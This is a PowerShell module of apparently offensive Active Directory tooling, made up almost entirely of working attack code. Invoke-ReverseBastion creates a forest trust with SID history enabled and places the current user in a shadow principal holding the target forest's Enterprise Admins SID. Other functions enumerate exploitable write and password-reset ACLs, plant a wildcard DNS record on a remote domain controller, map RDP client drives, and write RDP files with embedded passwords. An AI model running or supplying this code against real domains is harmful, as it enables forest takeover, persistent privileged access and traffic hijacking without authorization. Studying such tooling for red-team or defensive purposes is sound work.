function Add-TargetDnsForwarder {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain,
        [Parameter(Mandatory=$true)]
        [string]$TargetIP
    )

    $zone = try { Get-DnsServerZone -Name $TargetDomain -ErrorAction SilentlyContinue } catch { }

    if ($null -eq $zone) {
        Add-DnsServerConditionalForwarderZone -Name $TargetDomain -MasterServers $TargetIP -PassThru
    }
}

function Invoke-ReverseBastion {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain,
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true)]
        [string]$CurrentIP,
        [Parameter(Mandatory=$true)]
        [string]$TargetIP,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT,
        [Parameter(ParameterSetName="PassTheTicket")]
        [System.Security.SecureString]$TrustPassword
    )

    Import-Module ActiveDirectory
    [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")

    $CurrentDomain = $Env:USERDNSDOMAIN

    $feature = Get-ADOptionalFeature -Identity 'Privileged Access Management Feature'
    $scopes = $feature.EnabledScopes

    if ([string]$scopes -eq '') {
        Enable-ADOptionalFeature -Identity 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet -Target $CurrentDomain
    }
    
    try {
        Get-DnsServerZone -Name $TargetDomain -ErrorAction SilentlyContinue
    } catch {
        Add-DnsServerConditionalForwarderZone -Name $TargetDomain -MasterServers $TargetIP -PassThru
    }
    
    if ($PTT) {
        Invoke-Command -ComputerName $TargetDC -ScriptBlock {
            Add-DnsServerConditionalForwarderZone -Name $using:CurrentDomain -MasterServers $using:CurrentIP -PassThru
        }
    } else {
        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock {
            Add-DnsServerConditionalForwarderZone -Name $using:CurrentDomain -MasterServers $using:CurrentIP -PassThru
        }
    }

    $targetSid = if ($PTT) {
        (Get-ADGroup -Identity 'Enterprise Admins' -Server $TargetDC).SID.Value
    } else {
        (Get-ADGroup -Identity 'Enterprise Admins' -Server $TargetDC -Credential $Credential).SID.Value
    }

    $trustpass = if ($PTT) {
        $TrustPassword
    } else {
        $Credential.Password
    }

    $block = {
        param(
            [string]$CurrentDomain,
            [string]$TargetDomain,
            [System.Security.SecureString]$trustpass
        )
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")
        
        $trust = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain([System.DirectoryServices.ActiveDirectory.Forest]::GetForest($TargetDomain)).GetAllTrustRelationships() | Where-Object {
            $_.SourceName -eq $CurrentDomain -and $_.TargetName -eq $TargetDomain
        }

        if ($null -ne $trust) {
            $trust.UpdateLocalSideOfTrustRelationship(
                $CurrentDomain,
                $trustpass,
                [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                [System.DirectoryServices.ActiveDirectory.TrustType]::Forest
            )
        } else {
            [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
                $CurrentDomain,
                $trustpass,
                [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                [System.DirectoryServices.ActiveDirectory.TrustType]::Forest
            )
        }

        netdom trust $CurrentDomain /ForestTransitive:yes
        netdom trust $CurrentDomain /EnableSIDHistory:yes
        netdom trust $CurrentDomain /EnablePIMTrust:yes
        netdom trust $CurrentDomain /Verify
    }

    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
        $TargetDomain,
        $trustpass,
        [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
        [System.DirectoryServices.ActiveDirectory.TrustType]::Forest
    )

    if ($PTT) {
        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-CurrentDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
    } else {
        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-CurrentDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
    }

    $shadowcontainer = "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).ConfigurationNamingContext)"

    $targetnbname = if ($PTT) {
        (Get-ADDomain -Server $TargetDC).NetBIOSName
    } else {
        (Get-ADDomain -Server $TargetDC -Credential $Credential).NetBIOSName
    }

    $targetgroupname = $targetnbname + '-Enterprise Admins'

    New-ADObject -Type 'msDS-ShadowPrincipal' -Name $targetgroupname -Path $shadowcontainer -OtherAttributes @{'msDS-ShadowPrincipalSid'="$targetSid"}
    Set-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Add @{'member'="$((Get-ADUser -Identity $Env:USERNAME).DistinguishedName)"} -Verbose

    # Verify
    Get-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Properties Member, msDS-ShadowPrincipalSid
}

function Find-InterestingRemoteAcl {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    param(
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true)]
        [string]$ComputerName,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )

    if ($PTT) {
        $dom = (Get-ADDomain -Server $ComputerName).NetBIOSName
        New-PSDrive -Name $dom -PSProvider ActiveDirectory -Server $ComputerName -Root "//RootDSE/" -Scope Global

        $LDAPFilter = "(&"
        $LDAPFilter += "(|(objectClass=user)(objectClass=computer))"
        Get-ADGroup -LDAPFilter '(adminCount=1)' -Server $ComputerName | ForEach-Object {
            $LDAPFilter += "(!(memberof=$((Get-ADGroup -Identity $_ -Server $ComputerName).DistinguishedName)))"
        }
        Get-ADDomainController -Filter * -Server $ComputerName | ForEach-Object {
            $LDAPFilter += "(!(distinguishedName=$($_.ComputerObjectDN)))"
        }
        $LDAPFilter += '(!(sAMAccountName=krbtgt))'
        $LDAPFilter += ')'

        Get-ADObject -LDAPFilter $LDAPFilter -Server $ComputerName -Properties MemberOf | ForEach-Object {
            $user = $_
            $groups = Get-ADPrincipalGroupMembership -Identity $user -Server $ComputerName
            (Get-ADRootDSE -Server $ComputerName).NamingContexts | ForEach-Object {
                $nc = $_
                $groups | ForEach-Object {
                    $group = $_.Name
                    Get-ChildItem -Path ("$dom" + ":\$nc") -Recurse -Force | ForEach-Object {
                        Get-Acl -Path ("$dom" + ":\$_") | Select-Object PSChildName -ExpandProperty Access | Where-Object {
                            ($_.IdentityReference -eq "$dom\$user" -or $_.IdentityReference -eq "$dom\$group") -and $_.AccessControlType -eq "Allow" -and ($_.ActiveDirectoryRights -eq "GenericAll" -or $_.ActiveDirectoryRights -like "*Write*" -or $_.ActiveDirectoryRights -like "*Create*" -or $_.ActiveDirectoryRights -like '*Force-Change-Password*' -or $_.ActiveDirectoryRights -eq "Enroll") 
                        }
                    }
                }
            }
        } | Format-List

        Remove-PSDrive -Name $dom
    } else {
        $dom = (Get-ADDomain -Server $ComputerName -Credential $Credential).NetBIOSName
        New-PSDrive -Name $dom -PSProvider ActiveDirectory -Server $ComputerName -Root "//RootDSE/" -Credential $Credential -Scope Global

        $LDAPFilter = "(&"
        $LDAPFilter += "(|(objectClass=user)(objectClass=computer))"
        Get-ADGroup -LDAPFilter '(adminCount=1)' -Server $ComputerName -Credential $Credential | ForEach-Object {
            $LDAPFilter += "(!(memberof=$((Get-ADGroup -Identity $_ -Server $ComputerName -Credential $Credential).DistinguishedName)))"
        }
        Get-ADDomainController -Filter * -Server $ComputerName -Credential $Credential | ForEach-Object {
            $LDAPFilter += "(!(distinguishedName=$($_.ComputerObjectDN)))"
        }
        $LDAPFilter += '(!(sAMAccountName=krbtgt))'
        $LDAPFilter += ')'

        Get-ADObject -LDAPFilter $LDAPFilter -Server $ComputerName -Credential $Credential -Properties MemberOf | ForEach-Object {
            $user = $_
            $groups = Get-ADPrincipalGroupMembership -Identity $user -Server $ComputerName -Credential $Credential
            (Get-ADRootDSE -Server $ComputerName -Credential $Credential).NamingContexts | ForEach-Object {
                $nc = $_
                $groups | ForEach-Object {
                    $group = $_.Name
                    Get-ChildItem -Path ("$dom" + ":\$nc") -Recurse -Force | ForEach-Object {
                        Get-Acl -Path ("$dom" + ":\$_") | Select-Object PSChildName -ExpandProperty Access | Where-Object {
                            ($_.IdentityReference -eq "$dom\$user" -or $_.IdentityReference -eq "$dom\$group") -and $_.AccessControlType -eq "Allow" -and ($_.ActiveDirectoryRights -eq "GenericAll" -or $_.ActiveDirectoryRights -like "*Write*" -or $_.ActiveDirectoryRights -like "*Create*" -or $_.ActiveDirectoryRights -like '*Force-Change-Password*' -or $_.ActiveDirectoryRights -eq "Enroll") 
                        }
                    }
                }
            }
        } | Format-List

        Remove-PSDrive -Name $dom
    }
}

function Gen-RDPFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '', Scope='Function')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    Param (
        [string]$User,
        [string]$Password,
        [string]$IP,
        [string]$FileName,
        [int]$Width = 2880,
        [int]$Height = 1620,
        [int]$Port = 3389,
        [bool]$FullScreen = $false
    )

    $enc = ConvertTo-SecureString $Password -AsPlainText -Force | ConvertFrom-SecureString

    $screenMode = if ($FullScreen) {
        2
    } else {
        1
    }

    if ($(Test-Path -Path '\\tsclient\c')) {
        net use E: '\\tsclient\c'
    } elseif ($(Test-Path -Path '\\tsclient\e')) {
        net use E: '\\tsclient\e'
    }

    $fileContents = @"
screen mode id:i:$screenMode
use multimon:i:0
desktopwidth:i:$Width
desktopheight:i:$Height
session bpp:i:32
winposstr:s:0,1,465,143,3363,1810
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:${IP}:${Port}
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
remoteappmousemoveinject:i:1
redirectlocation:i:0
redirectwebauthn:i:1
enablerdsaadauth:i:0
drivestoredirect:s:*
username:s:$User
password 51:b:$enc
"@;

    $fileContents | Out-File -FilePath $PWD\$FileName.rdp -Force
}

function Add-RemoteDnsWildcardRecord {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(Mandatory=$true)]
        [string]$LocalIP
    )

    $ZoneName = $Env:USERDNSDOMAIN
    Add-DnsServerResourceRecordA -Name '*' -ZoneName $ZoneName -IPv4Address $LocalIP -ComputerName $TargetDC -ErrorAction Stop
}

function Enter-PlaintextWinRMSession {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetComputer,
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    $pass = ConvertTo-SecureString $Password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ($Username, $pass)

    Enter-PSSession -ComputerName $TargetComputer -Credential $cred
}

function Invoke-PSADSession {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    param(
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [string]$User,
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)]
        [string]$Password,
        [Parameter(Mandatory=$true)]
        [string]$ComputerName,
        [bool]$Interactive = $true,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )

    $ADModule = Get-Module -Name ActiveDirectory
    $ADModuleAssemblyPath = $ADModule.NestedModules[0].Path

    $ADAssemblyType = [System.Reflection.Assembly]::LoadFile($ADModuleAssemblyPath)

    $s = if ($PTT) {
        New-PSSession -ComputerName $ComputerName -Authentication Kerberos
    } else {
        $ss = ConvertTo-SecureString $Password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential($User, $ss)

        New-PSSession -ComputerName $ComputerName -Credential $cred
    }

    Invoke-Command -Session $s -ScriptBlock {
        Import-Module $Using:ADAssemblyType -Global
    }

    if ($Interactive) {
        Enter-PSSession $s
    } else {
        return $s
    }
}